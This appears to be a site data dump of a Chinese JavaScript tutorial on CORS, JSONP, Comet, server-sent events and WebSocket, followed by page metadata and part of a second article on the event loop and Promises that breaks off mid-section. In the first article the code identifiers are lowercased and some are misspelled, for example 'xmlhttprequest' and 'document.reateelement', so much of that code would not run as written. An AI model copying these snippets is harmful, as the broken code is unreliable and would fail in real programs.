简单请求\n\n大多浏览器是通过xmlhttprequest对象实现了对cors的原生支持。如果要检测浏览器的xhr是否支持cors，可以检测xhr对象上是否具有withcredentials属性（不支持ie10以及以前版本）。\n\n简单请求：请求方法要较为简单，自定义的头部信息较为安全和标准。也就是大部分情况满足下面条件即可（少部分去mdn查）：\n\n * 使用较为简单的请求方法，get或head或post。\n * 自定义头部字段accept、accept-language、content-language、content-type，这些字段的值要安全和标准。\n   * 其中content-type字段值必须是text/plain、multipart/form-data、application/x-www-form-urlencoded之一。\n   * 至于accept、accept-language和content-language是什么标准，可以查：网站1、网站2、网站3。\n\n简单请求的http头部有个非常重要的源信息，它是存储在origin字段里，它包含了请求页面的域名、端口和协议信息。如果服务器成功通过了这个请求，会在响应头部里使用access-control-allow-origin回发相同的源信息；如果访问的是公共资源，能被任意外域访问，那access-control-allow-origin得值就是'*'。\n\nfunction createcorsrequest(method, url, isasyn) {\n    var xhr = new xmlhttprequest();\n    // 检测xhr是否支持cors，只需判断对象上是否有withcredentials属性\n    if ('withcredentials' in xhr) {\n        xhr.open(method, url, isasyn);\n        return xhr;\n    }\n    return null;\n}\n// 这是一个简单请求\nvar request = createcorsrequest('get', 'http://bar.other/resources/public-data/', true);\nif (request) {\n    request.onload = function() { }\n    request.send();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n上面这个例子的简单请求的请求/响应报文可能如下：\n\n// 请求报文\nget /resources/public-data/ http/1.1\nhost: bar.other\nuser-agent: mozilla/5.0 (macintosh; u; intel mac os x 10.5; en-us; rv:1.9.1b3pre) gecko/20081130 minefield/3.1b3pre\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\naccept-language: en-us,en;q=0.5\naccept-encoding: gzip,deflate\naccept-charset: iso-8859-1,utf-8;q=0.7,*;q=0.7\nconnection: keep-alive\nreferer: http://foo.example/examples/access-control/simplexsinvocation.html\norigin: http://foo.example   // 请求的头部信息\n\n// 响应报文\nhttp/1.1 200 ok\ndate: mon, 01 dec 2008 00:23:53 gmt\nserver: apache/2.0.61\naccess-control-allow-origin: *  // 访问的是公共资源\nkeep-alive: timeout=2, max=100\nconnection: keep-alive\ntransfer-encoding: chunked\ncontent-type: application/xml\n\n[xml data]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 3.3 非简单请求\n\n非简单请求就是除了上一节的简单请求以外的一些特殊http请求，比如使用patch方法、delete方法、mime类型的post方法等。对于非简单请求，浏览器会先使用options方法对服务器发起一个预检请求，服务器对预检请求信息进行检查（因为这类请求比简单请求不安全不标准，所以要预检），预检通过后服务器才会允许该源站发送实际的跨源请求（那就可以继续进行非简单请求了），并且还告知该源站以后是否需要携带身份凭证（http认证相关数据和cookie）。\n\n预检请求的头部里依然有origin，除了origin还有两个重要字段access-control-request-method和access-control-request-headers。\n\n * access-control-request-method是告知服务器之后的实际跨域请求将使用什么方法（patch？post？）。\n * access-control-request-headers是告知服务器之后的实际跨域请求将携带什么自定义请求头部字段。\n\n同样，服务器成功通过预检请求后，返回给浏览器的响应头部除了有access-control-allow-origin之外，还有三个重要字段：\n\n * access-control-allow-methods: 表明服务器允许客户端使用哪些方法。\n * access-control-allow-headers: 表明服务器允许携带那些自定义请求头部字段。\n * access-control-max-age: 是一个秒单位的数值，表明该非简单请求在这个时间内不用进行第二次预检了。\n\nfunction createcorsrequest(method, url, isasyn) {\n    var xhr = new xmlhttprequest();\n    // 检测xhr是否支持cors，只需判断对象上是否有withcredentials属性\n    if ('withcredentials' in xhr) {\n        xhr.open(method, url, isasyn);\n        // 自定义了两个头部字段，并会体现在`access-control-request-headers`字段里\n        xhr.setrequestheader('x-pingother', 'pingpong');\n        xhr.setrequestheader('content-type', 'application/xml');\n        return xhr;\n    }\n    return null;\n}\n// 这是一个非简单请求\nvar request = createcorsrequest('post', 'http://bar.other/resources/post-here/', true);\nif (request) {\n    request.onload = function() { }\n    request.send('<?xml version=\"1.0\"?><person><name>arun</name></person>');\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n预检的请求/响应报文\n\n// 请求报文\noptions /resources/post-here/ http/1.1\nhost: bar.other\nuser-agent: mozilla/5.0 (macintosh; u; intel mac os x 10.5; en-us; rv:1.9.1b3pre) gecko/20081130 minefield/3.1b3pre\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\naccept-language: en-us,en;q=0.5\naccept-encoding: gzip,deflate\naccept-charset: iso-8859-1,utf-8;q=0.7,*;q=0.7\nconnection: keep-alive\n// 源信息\norigin: http://foo.example\n// 告知服务器，之后实际跨域请求，它使用的是post方式\naccess-control-request-method: post\n// 告知服务器，之后实际跨域请求里，我会携带x-pingother和content-type这两个自定义头部字段\naccess-control-request-headers: x-pingother, content-type\n\n// 响应报文\nhttp/1.1 200 ok\ndate: mon, 01 dec 2008 01:15:39 gmt\nserver: apache/2.0.61 (unix)\n// 源信息\naccess-control-allow-origin: http://foo.example\n// 告知客户端，之后实际跨域请求可使用post、get、options方法\naccess-control-allow-methods: post, get, options\n// 告知客户端，之后实际跨域请求可携带x-pingother和content-type这两个自定义头部字段\naccess-control-allow-headers: x-pingother, content-type\n// 告知客户端，该非简单请求在24小时内不用进行第二次预检了\naccess-control-max-age: 86400\nvary: accept-encoding, origin\ncontent-encoding: gzip\ncontent-length: 0\nkeep-alive: timeout=2, max=100\nconnection: keep-alive\ncontent-type: text/plain\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n之后的实际跨域请求/响应报文：\n\npost /resources/post-here/ http/1.1\nhost: bar.other\nuser-agent: mozilla/5.0 (macintosh; u; intel mac os x 10.5; en-us; rv:1.9.1b3pre) gecko/20081130 minefield/3.1b3pre\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\naccept-language: en-us,en;q=0.5\naccept-encoding: gzip,deflate\naccept-charset: iso-8859-1,utf-8;q=0.7,*;q=0.7\nconnection: keep-alive\nx-pingother: pingpong\ncontent-type: text/xml; charset=utf-8\nreferer: http://foo.example/examples/preflightinvocation.html\ncontent-length: 55\norigin: http://foo.example\npragma: no-cache\ncache-control: no-cache\n\n<?xml version=\"1.0\"?><person><name>arun</name></person>\n\n\nhttp/1.1 200 ok\ndate: mon, 01 dec 2008 01:15:40 gmt\nserver: apache/2.0.61 (unix)\naccess-control-allow-origin: http://foo.example\nvary: accept-encoding, origin\ncontent-encoding: gzip\ncontent-length: 235\nkeep-alive: timeout=2, max=99\nconnection: keep-alive\ncontent-type: text/plain\n\n[some gzip'd payload]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 3.4 带凭据的请求\n\n默认情况下，对于跨域xmlhttprequest请求，浏览器不会发送身份凭证信息。如果要发送（预检结果告诉你下次请求要带凭证），可以将withcredentials属性设置为true，让请求携带凭证信息传给服务器。服务器也接收带凭证的请求，会将access-control-allow-credentials:true添加到响应头部信息里。\n\nfunction createcorsrequest(method, url, isasyn) {\n    var xhr = new xmlhttprequest();\n    // 检测xhr是否支持cors，只需判断对象上是否有withcredentials属性\n    if ('withcredentials' in xhr) {\n        xhr.open(method, url, isasyn);\n        // 发送的请求里携带了身份凭证信息\n        xhr.withcredentials = true;\n        return xhr;\n    }\n    return null;\n}\nvar request = createcorsrequest('get', 'http://bar.other/resources/credentialed-content/', true);\nif (request) {\n    request.onload = function() { }\n    request.send();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n而浏览器发的请求带了凭证，但服务器没有access-control-allow-credentials，那最终js会获取不到这个响应信息（response为空），并会触发onerror事件。\n\n\n# 四、其他跨域技术\n\n\n# 4.1 图像ping\n\n一个网页可以从任何网页中加载图像，不用担心跨域问题。动态创建图像，使用它们的onload和onerror事件处理程序是否接收到响应。\n\n动态创建图像常使用图像ping，请求的数据是通过查询字符串形式发送的，而响应可以是任意内容（通常是像素图或204响应）。不过它只能发送get请求，无法访问服务器的响应文本，也就是说它是单向的数据传输。\n\n通过图像ping，浏览器得不到任何具体的数据，但通过侦听load和error事件，它能知道响应是什么时候接收到的。\n\nvar img = new image();\nimg.onload = img.onerror = function(){\n    alert(\"done!\");\n}\n// 发送了一个name参数，图像ping常用于跟踪用户点击次数\nimg.src = \"http://www.example.com/test?name=nicholas\";\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 4.2 jsonp\n\njsonp（json with padding）是填充式json或参数式json，讲一个回调函数追加到跨域访问的地址后面，再这个字符串放到<scipt>标签的src属性里，在页面加载这个<script>时（和图像ping类似，可从任何网址加载脚本），会对服务器发起请求，当响应达到时，回调函数会被触发，回调函数里的参数就是response响应数据。\n\nfunction handleresponse(response) {\n    console.log('response.ip', response.ip);\n    console.log('response.city', response.city);\n    console.log('response.region_name', response.region_name);\n}\nvar script = document.reateelement(\"script\");\n// 将jsonp放入到跨域地址后面\nscript.src = \"http://freegeoip.net/json?callback=handleresponse\";\ndocument.body.insertbefore(script, document.body.firstchild);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\njsonp相比于图像ping类，它能够直接访问响应文本（response），是双向的。但如果服务器不安全，响应中可能夹带恶意代码；还有确定jsonp请求是否失败并不容易，有可能需要定时器来监视。\n\n\n# 4.3 comet\n\najax是页面向服务器请求数据，而comet是一种服务器向页面推送数据的技术。comet（服务器推送）有两种实现：长轮询和流。\n\n短轮询（也叫常规轮询），浏览器定期发送请求给服务器，服务器会将目前为止的数据作为响应传递给浏览器（不管该数据是否有效）。服务器会一直被动接收请求，还得必须作出响应，尽管可能是无效的响应，这非常消耗服务器的性能。\n\n\n\n而长轮询，浏览器发送一个请求，服务器虽然始终处于连接打开，但是没有新数据是不会推送数据给浏览器，直到有新数据可发送才会去推送。服务器掌握了主动权，只发送有效的数据，这很节省服务器资源。无论是短轮询还是长轮询，浏览器在接收数据之前，都会先发起对服务器的连接。\n\n\n\n流就是http流，它在页面的整个生命周期内只使用一个http连接。浏览器向服务器发送一个请求，服务器就会一直保持连接打开，并周期性向浏览器推送数据。（长轮询本质还是一个个http连接，流就只有一个，且readystate大部分时间是3）。流常用于服务器将输出缓存内容一次性全部发送给客户端。\n\nfunction createstreamingclient(url, progress, finished) {\n    var xhr = new xmlhttprequest();\n    var received = 0; // 处理了多少个字符\n    xhr.open('get', url, true);\n    xhr.onreadystatechange = function() {\n        var result;\n        if (xhr.readystate == 3) {\n            result = xhr.responsetext.substring(received);\n            received += result.length; // 每次递增\n            progress(result);\n        } else if (xhr.readystate == 4) {\n            finished(xhr.responsetext);\n        }\n    }\n    xhr.send(null);\n    return xhr;\n}\nvar client = createstreamingclient('streaming.php', function(data) {\n    console.log(\"received：\" + data);\n}, function() {\n    console.log(\"done!\");\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n管理comet连接是很容易出错的，随着时间的推移，社区为comet提供了两个新的api来完善以前的问题。\n\n\n# 4.4 服务器发送事件\n\nsse（serve-sent events，服务器发送事件）是用于创建服务器到浏览器的单向连接，服务器可以通过这个连接发送任意数量的数据。服务器响应的mime类型必须是text/event-strean，而且数据输出要能被js的api解析。\n\n使用sse时要订阅新的事件流，实例化eventsource，并将一个url作为第一个参数，如果要跨域那第二参数应该是{withcredentials: true}。\n\neventsource实例对象有个readystate属性，值为0表示正在连接，1表示连接成功，2表示连接关闭了。如果你非要关闭连接，可以使用close()方法，但是你想重新使用eventsource，只能重新实例化eventsource（订阅新的事件流）。\n\neventsource还有三个事件：\n\n * open：在建立连接时触发。\n * message：在从服务器接收到新事件时触发，事件回调有个event参数，该参数有个data属性，该属性就是服务器返回的数据（字符串）。\n * eror：在无法建立连接时触发。\n\n// 异步的eventsource\nlet eventsource = new eventsource(\"/events/subscribe\", {withcredentials: true});\neventsource.onmessage = function(event) {\n    // json形式的：{\"user\":\"bob\",\"message\":\"first line\\n second line\"}\n    console.log(\"message\", event.data);\n};\n\n\n1\n2\n3\n4\n5\n6\n\n\n响应格式可能是纯文本的，最简单的情况是每个数据项都带有前缀data:，例如：\n\ndata: foo\n\ndata: bar\n\ndata: foo\ndata: bar\n\n\n1\n2\n3\n4\n5\n6\n\n\n上面这样的文本，在之前代码的console.log(\"message\", event.data)，会输出三次，第一次是foo，第二次是bar，第三次是foo\\nbar。data:是相邻两行，那么它们将作为一条message返回，中间会插入\\n换行符（对应服务器生成流时也只用一个\\n）。如果data:之间有空行，它们会作为两条message返回（对应服务器生成流时用两个\\n）。\n\nsse支持短轮询、长轮询和http流，而且能在断开连接时自动确定何时重新连接，服务器可设置延迟响应时间retry: 3000。\n\n为了正确地重新连接，每一条消息都应设置一个id，具体是通过前缀id:来给message添加id的，这个id: 1紧挨着data:上一行或下一行都可以。而浏览器收到带有id的message时，eventsource实例对象会有个lasteventid属性，它就是id的具体值。\n\nid: 1\ndata: foo\n\ndata: bar\nid: 2\n\nid: 3\ndata: foo\ndata: bar\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n如果断开连接，会向服务器发送一个包含last-event-id字段的特殊头部的请求，以便服务器知道下一次该触发哪个事件（保证浏览器能接收到顺序正确的数据）。\n\n\n# 4.5 web socket\n\nweb socket是在一个单独的持久连接上提供全双工、双向通信，http协议升级到web socket协议（服务器要使用专门支持这种协议的服务器）。未加密的连接不再是http://而是ws://；加密连接也不再是https://而是wss//。\n\n可以对比一下websocket和eventsource：\n\nwebsocket          eventsource\n双向：客户端和服务端都能交换消息   单向：仅服务端能发送消息\n二进制和文本数据           仅文本数据\nwebsocket 协议       常规 http 协议\n\nwebsocket协议能让客户端与服务端之间发送非常少量的数据，而不用担心http那样字节级的开销。由于websocket传递的数据包很小，所以它非常适合移动应用，可以最大程度解决宽带和网络延迟的问题。\n\n使用websocket，得先实例化websocket，并传入连接的url。同源策略对websocket不适用（没有跨域限制），因此可以通过它打开任何站点的连接。\n\n实例化websocket后，浏览器会立马尝试创建连接。websocket实例对象也有一个readystate属性：\n\n * websocket.connecting，值是0：正在建立连接\n * websocket.open，值是1：已经建立连接\n * websocket.closing，值是2：正在关闭连接\n * websocket.closed，值是3：已经关闭连接\n\nwebsocket还有4个事件：\n\n * open：在成功建立连接时触发。\n * message：在接收到数据时触发。\n * error：在发生错误时触发，连接不能持续了。\n * close：在连接关闭时触发。\n\n使用websocket发送数据是send(param)方法，param就是要发送的数据，param只能是纯文本，如果是对象就要使用json.stringify(param)进行转换（序列化）。使用websocket接收数据，在message事件的回调函数中，该函数的参数event，这个event的data属性就是返回数据，该数据是穿文本字符串，一般使用前要经过json.parse()进行转换。\n\n一个较为完整的例子：\n\nvar socket = new websocket(\"wss://www.example.com/server.php\");\n\n// 连接已建立\nsocket.onopen = function(e) {\n    // 因为连接的建立是异步的，所以得保证连接建立了才发送请求。\n    // 如果参数是对象，要转换为json字符串\n    socket.send(json.stringify({name: 'bob'}));\n};\n// 接收到数据\nsocket.onmessage = function(event) {\n    // 返回的event.data是json字符串，需要转换为对象\n    var data = json.parse(event.data);\n    console.log(`接收到数据：${data}`);\n};\n// 连接关闭，当我们不再使用websocket可以关闭它：socket.close([code], [reason])\nsocket.onclose = function(event) {\n    if (event.wasclean) {\n        // 正常关闭，code一般为1000\n        console.log(`websocket连接正常关闭， code=${event.code} reason=${event.reason}`);\n    } else {\n        // 服务器进程被杀死或网络中断，event.code 通常为 1006\n        console.log(`websocket连接丢失， code=${event.code} reason=${event.reason}`);\n    }\n};\n// 连接发生错误\nsocket.onerror = function(error) {\n  console.log(`websocket发生了错误：${error.message}`);\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n",charsets:{cjk:!0}},{title:"7.异步编程",frontmatter:{title:"7.异步编程"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/7.%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B.html",relativePath:"book-web/html、css、js、ts/学习JavaScript/7.异步编程.md",key:"v-650d1a88",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/7.%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B.html",headers:[{level:2,title:"EventLoop",slug:"eventloop",normalizedTitle:"eventloop",charIndex:11},{level:2,title:"Promise",slug:"promise",normalizedTitle:"promise",charIndex:822},{level:3,title:"什么是Promise",slug:"什么是promise",normalizedTitle:"什么是promise",charIndex:4169},{level:3,title:"调用处使用Promise",slug:"调用处使用promise",normalizedTitle:"调用处使用promise",charIndex:4389},{level:3,title:"Promise对象内部",slug:"promise对象内部",normalizedTitle:"promise对象内部",charIndex:5499},{level:3,title:"关于错误处理",slug:"关于错误处理",normalizedTitle:"关于错误处理",charIndex:6863},{level:3,title:"时序和拒绝事件",slug:"时序和拒绝事件",normalizedTitle:"时序和拒绝事件",charIndex:7377},{level:3,title:"Promise组合工具",slug:"promise组合工具",normalizedTitle:"promise组合工具",charIndex:7923},{level:3,title:"resolve一个Promise对象",slug:"resolve一个promise对象",normalizedTitle:"resolve一个promise对象",charIndex:9072},{level:2,title:"async和await",slug:"async和await",normalizedTitle:"async和await",charIndex:12482},{level:3,title:"简单使用async和await",slug:"简单使用async和await",normalizedTitle:"简单使用async和await",charIndex:12498},{level:3,title:"async和await相关执行顺序",slug:"async和await相关执行顺序",normalizedTitle:"async和await相关执行顺序",charIndex:14117}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"EventLoop Promise 什么是Promise 调用处使用Promise Promise对象内部 关于错误处理 时序和拒绝事件 Promise组合工具 resolve一个Promise对象 async和await 简单使用async和await async和await相关执行顺序",content:'# 异步编程\n\n\n# EventLoop\n\n> 参考资料1：8 Web application APIs\n> 参考资料2：跟着whatwg看一遍事件循环\n> 参考资料3：HTML系列：macrotask和microtask\n\njs引擎是单线程运行的，同一时刻只能执行一个代码块。比如请求接口时，如果js引擎停下来等服务端传来响应，那就会阻塞其他代码运行。所以js引擎处理接口是异步的，会将接口响应任务存消息队列里然后就执行其他代码了，等后面执行栈空闲了再来处理响应任务。类似的还有定时器、侦听器等，它们可以说是异步请求同步执行，意思是请求我发给你了，但我得处理其他主要事情（异步请求）；就算你响应立马给我了，我也只是暂时排在任务列表里，手头里主要事情做完了才会去处理响应（同步处理）。\n\njs引擎对这些异步操作就是使用EventLoop事件循环来调配处理的，所用的消息队列分为task队列和microtask队列。EventLoop的一个处理回合：首先会先执行task队列中的一个任务，然后再执行microtask队列里的所有任务，最后再根据需要与否去渲染页面。在这个回合中是同步执行的，不会出现既要处理这个任务也要处理那个任务。\n\nEventLoop中task队列可能有多个，原因是其中一个task队列负责优先级比较高的任务（鼠标键盘事件等），另一个task队列负责普通的任务（定时器等）；还有task队列是Set而不是Queue，EventLoop会从中取最早并且可执行的任务出来并推入执行栈中执行。比较常见的task：setTimeout、setInterval、setImmediate、requestAnimationFrame、I/O，还有类似click、ajax还有<script>标签里的代码。\n\nEventLoop中microtask队列一般只有一个，并且是Queue，找元素用的是出队列的方式。比较常见的microtask：Promise、Object.observe、MutationObserver。\n\n<html>\n<head>\n    <script>\n        (function test() {\n            setTimeout(() => {\n                console.log(1)\n            }, 0);\n            new Promise((resolve) => {\n                console.log(2);\n                for (var i = 0; i < 10000; i++) {\n                    i == 9999 && resolve(3);\n                }\n                console.log(4);\n            }).then((data) => {\n                console.log(data);\n            });\n            console.log(5);\n        })()\n    <\/script>\n    <script>\n        (function test2() {\n            setTimeout(() => {\n                console.log(6)\n            }, 0);\n            new Promise((resolve) => {\n                console.log(7);\n                for (var i = 0; i < 10000; i++) {\n                    i == 9999 && resolve(8);\n                }\n                console.log(9);\n            }).then((data) => {\n                console.log(data);\n            });\n            console.log(10);\n        })();\n    <\/script>\n</head>\n<body></body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n上面这段程序在谷歌浏览器中执行的，其打印顺序就是：2 4 5 3 7 9 10 8 1 6。\n\n * 首先两个<script>标签里代码的运行是两个task，先添加进task队列里；\n * 从task队列里取可执行的task，也就是第一个<script>标签开始执行；\n * 遇到setTimeout，将它放入task队列里；\n * 因为Promise内部是同步的，所以先打印2和4，在resolve()后会把Promise的then回调函数放入microtask队列里；\n * 遇到console.log(5)，打印完5才表示一个task执行完了，现在得去执行microtask队列所有任务；\n   * microtask队列目前就一个then回调函数，那么打印3，结束microtask队列，进入新的task。\n * 从task队列里取可执行的task，也就是第二个<script>标签开始执行；\n * 遇到setTimeout，将它放入task队列里；\n * 因为Promise内部是同步的，所以先打印7和9，在resolve()后会把Promise的then回调函数放入microtask队列里；\n * 遇到console.log(10)，打印完10才表示一个task执行完了，现在得去执行microtask队列所有任务；\n   * microtask队列目前就一个then回调函数，那么打印8，结束microtask队列，进入新的task。\n * 从task队列里取可执行的task，也就第一个setTimeout，打印1；\n * 从task队列里取可执行的task，也就第二个setTimeout，打印6；\n * 结束了，以上省略了UI渲染，因为没有涉及到页面的操作。\n\n上面这些都是说浏览器的EventLoop，其实node环境中还是不一样的，node.js有用到process.nextTick，它并不是EventLoop中的一部分，它是优先于microtask执行的；还有一个setImmediate，是个定时器，在I/O操作中先于任何其他定时器的，但非I/O操作里setImmediate的先后就不一定了，比较受线程性能的影响（比如设置毫秒数是0到几十的时候，setTimeout一般优于setImmediate）。有兴趣可以查看Node.js 事件循环。\n\n(() => {\n    setImmediate(() => {\n        console.log(1);\n    }, 0);\n    setTimeout(() => {\n        console.log(2);\n    }, 0);\n    function a() {\n        setImmediate(() => {\n            console.log(3);\n        }, 0);\n        setTimeout(() => {\n            console.log(4);\n        }, 0);\n        new Promise((resolve) => {\n            console.log(5);\n            resolve(6);\n            console.log(7);\n        }).then((data) => {\n            console.log(data);\n        });\n        console.log(8);\n        process.nextTick(() => {\n            console.log(9);\n        });\n        console.log(10);\n    }\n    new Promise((resolve) => {\n        console.log(11);\n        resolve(12);\n        console.log(13);\n    }).then((data) => {\n        console.log(data);\n    });\n    a();\n    console.log(14);\n    process.nextTick(() => {\n        console.log(15);\n    });\n    console.log(16);\n})();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n上面这段程序在node中执行的，其打印顺序就是：11 13 5 7 8 10 14 16 9 15 12 6 2 4 1 3。具体不展开了，有时间再来扩展node中EventLoop。\n\n\n# Promise\n\n上一节后，我们对异步操作的背后有了比较清晰的认知，但这都是浏览器内部的处理，我们书写互相依赖的异步操作的时候，就非常容易形成“回调地狱”，所以后面es6提出了使用Promise来解决这种问题。\n\n\n# 什么是Promise\n\nPromise内存储着一个异步操作，这个异步操作要等到未来才会有结果。Promise存储的异步操作有三种状态：pending（进行中）、fulfilled（已兑现）和rejected（已拒绝），这三种状态就是异步操作的结果赋予的，其他人改变不了。\n\n还有一个经常跟Promise一起使用的术语：resolved（已决议）。它表示异步操作敲定好了状态，该状态可能是fulfilled也可能是rejected。\n\n\n# 调用处使用Promise\n\n未推出Promise时，一般做法就是回调函数会作为异步函数的入参，异步函数里的异步操作结束后会根据结果来执行对应的入参（执行回调函数）。推出Promise后，不会将回调函数传给异步函数，而是异步函数会返回Promise对象，异步操作结束后会根据结果来调用Promise对象的then中对应的回调函数。\n\n// 以前的调用：将sucFun和failFun以参数的形式传给异步函数doA，根据需要会执行sucFun和failFun\ndoA(data, sucFun, failFun);\n// 使用Promise：异步函数doA会返回一个promise对象，根据需要会执行promise对象的then方法里的sucFun和failFun\ndoA(data).then(sucFun, failFun);\n\n\n1\n2\n3\n4\n\n\n.then(onFulfilled[, onRejected])中第一个参数是成功回调函数，第二个参数是失败回调函数（可选参数），并且then会返回了一个Promise对象，那就可以继续使用then，这样就会形成一种链式调用。以前接口互相依赖时采用嵌套写法，写起来非常占位置也不美观，现在使用Promise会非常清爽。\n\n// 以前，函数嵌套\ndoA(data, (rlt) => {\n  doB(rlt, (newRlt) => {\n    doC(newRlt, (finRlt) => {\n      console.log(\'FinalResult:\', finRlt);\n    }, failFun);\n  }, failFun);\n}, failFun);\n\n// 使用Promise，链式\ndoA().then((rlt) => {\n    return doB(rlt); // 返回doB的Promise对象，好让后面继续使用链式结构\n}).then((newRlt) => {\n    return doC(newRlt);\n}).then((finRlt) => {\n    console.log(\'FinalResult:\', finRlt);\n}).catch(failFun);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n注意：onFulfilled或onRejected执行完后，then是返回的一个新promise。也就是说你在onFulfilled或onRejected里自己返回一个值或者Error时，也是返回一个promise，可以继续在后面写then这种链式调用。\n\n\n# Promise对象内部\n\n上一节是说怎么使用Promise的方式调用异步函数，并且展示了多个异步函数时使用Promise方式的优势。这一节说的是异步函数内部会返回一个Promise对象，这个过程会是一个什么样子呢？\n\n首先在异步函数里创建一个Promise对象，new Promise((resolve, reject) => {})；Promise构造函数会传递一个参数，这个参数是一个executor处理器函数，是专门用于处理具体的异步操作的；操作完异步操作当然还要通知调用方，executor函数的两个入参resolve和reject就是专门做这些事的；当异步任务顺利完成且返回结果值时，会执行resolve方法，将Promise对象的状态置为fulfilled；而当异步任务失败且返回失败原因，会执行resolve方法，将Promise对象的状态置为rejected。\n\nfunction doA(data) {\n    // Promise对象内部（当前小节的内容）\n    return new Promise((resolve, reject) => { // 这个匿名函数其实是executor函数\n        /* 某某异步操作 */\n        if (/* 操作成功 */)\n            resolve(result); // 通知操作成功，data是异步操作的结果\n        else\n            reject(error); // 通知操作失败，error是一个异常对象\n    });\n}\n// 调用处使用Promise（上一小节的内容）\ndoA(data).then((result) => { // 接收resolve通知\n    console.log(result);\n}, (error) => { // 接收reject通知\n    console.log(error);\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n一个使用Promise封装ajax的例子：\n\nfunction get(url) {\n    return new Promise((resolve, reject) => {\n        $.ajax({\n            url: url,\n            method: \'get\' ,\n            success: (data) => {\n                resolve(data);\n            },\n            error: (xhr, statusText) => {\n                reject(statusText);\n            }\n        });\n    });\n}\nget(\'xxx\').then((result) => {\n    return result;\n}, (error) => {\n    return error;\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 关于错误处理\n\n错误处理：遇到异常抛出时，会顺着Promise链寻找下一个onRejected失败回调函数（then中的onRejected），如果没有一个onRejected，就会去.catch()里指定的函数里执行。可以看调用处使用promise的第二个例子，其中有三次failFun，但最后只用.catch()来处理。\n\n可以对错误进行精准的捕获，只是需要嵌套Promise。下面这个例子中内部嵌套了一个Promise，并且还带了一个catch，这个catch能精准捕获到doB和doC的失败，而doA只会被最外层的catch会捕获。\n\n// 使用Promise，链式\ndoA()\n.then(\n    rlt => doB(rlt).then(optRlt => doC(optRlt)).catch(e => {console.log(e.message)})\n)\n.then(newRlt => doD(newRlt))\n.then(finRlt => { console.log(\'FinalResult:\', finRlt) })\n.catch(failFun);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 时序和拒绝事件\n\n已经变成resolve状态的Promise对象，会通知then()里对应的函数，这个通知传递的过程是异步的。也就是说传递到then()中的回调函数是会被放到一个microtask队列里的，不过Promise对象里其他的执行还是同步，这就能印证EventLoop里第一个例子中2和4为什么先于3打印。\n\n拒绝事件：当Promise被拒绝时，如果有reject函数处理了，就会派发rejectionhandled事件到全局作用域；如果没有经过reject函数处理，则会派发unhandledrejection事件到全局作用域。两个事件都有promise属性和reason属性，其中promise属性是指向被驳回的promise，reason属性是说明被驳回的原因。\n\nwindow.addEventListener("unhandledrejection", event => {\n  /* 你可以在这里添加一些代码，以便检查\n     event.promise 中的 promise 和\n     event.reason 中的 rejection 原因 */\n  event.preventDefault();\n}, false);\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# Promise组合工具\n\nPromise.resolve(value)：手动创建一个已经resolve的Promise对象，相当于new Promise(resolve => resolve(value))（但不完全是，因为下一节会讲new Promise(r => r(v))中v是个Promise对象的情况）。\n\nPromise.reject(value)：手动创建一个已经reject的Promise对象，相当于new Promise((resolve, reject) => reject(value))。\n\nvar p = Promise.all([p1, p2, p3])：all接受一个Promise对象数组（也可以是Iterator并且返回Promise对象），当数组里所有的Promise对象状态为fulfilled时，p这个Promise对象状态才为fulfilled，并且结果也会组成数组传递给p的回调函数；当数组里只要一个被rejected了，那么p就是rejected状态，其结果会传递给p的回调函数。\n\nvar p = Promise.race([p1, p2, p3])：race接受一个Promise对象数组（也可以是Iterator并且返回Promise对象），当数组里只要一个被确定状态了，那么p就是随之确定状态了，其结果会传递给p的回调函数。\n\n// 